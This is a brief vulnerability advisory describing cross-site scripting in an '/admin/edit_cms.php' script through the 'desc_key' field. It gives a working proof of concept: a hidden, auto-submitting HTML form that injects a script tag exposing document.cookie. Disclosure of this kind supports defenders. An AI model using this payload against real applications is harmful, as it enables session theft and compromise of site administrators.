Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application. 

The vulnerability exists due to failure in the "/admin/edit_cms.php" script to properly sanitize user-supplied input in "desc_key" and other variables. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following sample PoC is available:


<form action='http://www.example.com/admin/edit_cms.php?page=1' name="frm" method='post'  >
<input name="title" type="hidden" value="Home"/>
<input name="type" type="hidden" value="header"/>
<input name="desc_meta" type="hidden" value="page+desc" />
<input name="desc_key" type="hidden" value='"><script>alert(document.cookie)</script>' />
<input name="cms_id" type="hidden" value="1" />
<input name="edit_page" type="hidden" value="Edit+Page" />
</form>
<script>
document.frm.submit();
</script>
